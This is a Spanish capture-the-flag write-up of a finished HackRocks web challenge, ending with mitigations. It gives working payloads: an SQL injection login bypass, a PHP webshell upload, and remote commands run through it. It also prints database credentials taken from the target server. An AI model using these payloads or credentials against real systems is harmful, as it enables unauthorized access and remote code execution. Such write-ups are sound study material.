---
title: "Amazonas — HackRocks"
date: 2026-05-13
description: "Reto web: bypass de autenticación vía SQL injection, subida de webshell PHP y RCE."
excerpt: "SQLi para saltar el login → subir webshell PHP → RCE → lectura de la flag."
platform: "CTF"
difficulty: "Medium"
image: "/images/ctf.svg"
tags:
  - "Web"
  - "SQLi"
  - "Auth Bypass"
  - "File Upload"
  - "Webshell"
  - "RCE"
  - "HackRocks"
---

> **Web · HackRocks UDLA · Medium** — reto de competición finalizado. Flags redactadas.

| | |
|---|---|
| **Categoría** | Hacking Web |
| **Dificultad** | Medio |
| **Puntos** | 50 |
| **Target** | https://challenges.hackrocks.com/amazona |
| **Flag** | `flag{REDACTED}` |

## Enunciado

Web de la banda *Wifi Thieves* que hay que comprometer. Pistas:
1. **SQL injection** (sin fuerza bruta).
2. Se pueden **subir ficheros** → ¿webshell?
3. Una webshell básica: `system($_GET['cmd'])`.

## Reconocimiento

```bash
$ curl -sI https://challenges.hackrocks.com/amazona/
HTTP/1.1 302 Found
X-Powered-By: PHP/8.1.34
Location: ./login.php
```

App PHP con login (`/api/login.php`) que recibe `username` y `password`.

## Explotación

### 1. Bypass de autenticación vía SQLi

Login normal → redirige de vuelta a `login.php`. Con un payload de inyección clásico el
servidor nos autentica y redirige al panel:

```bash
$ curl -i -c cookies.txt https://.../amazona/api/login.php \
     --data-urlencode "username=admin' -- -" \
     --data-urlencode "password=x"
HTTP/1.1 302 Found
Location: ../dashboard.php          # <- sesión válida
```

El backend construye algo como
`SELECT ... WHERE username='admin' -- -' AND password='...'`,
comentando la verificación de contraseña.

### 2. Subida de webshell PHP

`dashboard.php` ofrece un formulario de subida de "temporary files". Subimos una
webshell mínima:

```php
<?php system($_GET["cmd"]); ?>
```

```bash
$ curl -b cookies.txt -F "file=@sh.php" -F "date=note" https://.../amazona/dashboard.php
# -> "File has been uploaded to server uploads directory"
```

### 3. RCE

El fichero queda en `/uploads/`:

```bash
$ curl -G https://.../amazona/uploads/sh.php --data-urlencode "cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4. Lectura de la flag

```bash
$ curl -G https://.../amazona/uploads/sh.php --data-urlencode "cmd=cat /flag"
flag{REDACTED}
```

## Flag

```
flag{REDACTED}
```

## Impacto adicional

Vía RCE quedaron expuestas credenciales en el entorno (no necesarias para la flag, pero
evidencian el impacto real):

```
MYSQL_USER=esquolack
MYSQL_PASSWORD=lINCH2qHeYhujJnw
MYSQL_ROOTPASSWORD=6cWytPCo1tWJfWW3xPTCKCDhinwXwUB9
MYSQL_DATABASE=esquolackDB
```

## Conclusión

Cadena típica de web app: **SQLi auth-bypass → subida sin validación → webshell → RCE**.
Dos fallos encadenados (autenticación inyectable y subida de ficheros sin restricción de
extensión ni del directorio de ejecución) llevan a ejecución remota completa.
Mitigaciones: *prepared statements*, validar extensión/tipo, almacenar uploads fuera del
*docroot* o sin permiso de ejecución.
